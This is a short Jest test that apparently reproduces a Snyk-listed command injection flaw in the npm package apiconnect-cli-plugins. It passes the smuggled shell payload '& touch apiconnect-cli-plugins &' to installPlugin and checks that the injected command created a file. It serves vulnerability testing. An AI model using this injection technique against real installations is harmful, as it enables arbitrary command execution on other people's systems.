//https://snyk.io/vuln/SNYK-JS-APICONNECTCLIPLUGINS-564427
test("Command Injection in apiconnect-cli-plugins", () => {
  const root = require("apiconnect-cli-plugins");
  const fs = require("fs");
  const path = "./apiconnect-cli-plugins";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let payload = "& touch apiconnect-cli-plugins &";
  let RUN = root.pluginLoader.installPlugin(payload, "");
  RUN.then(() => {
    sleep.sleep(5);
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
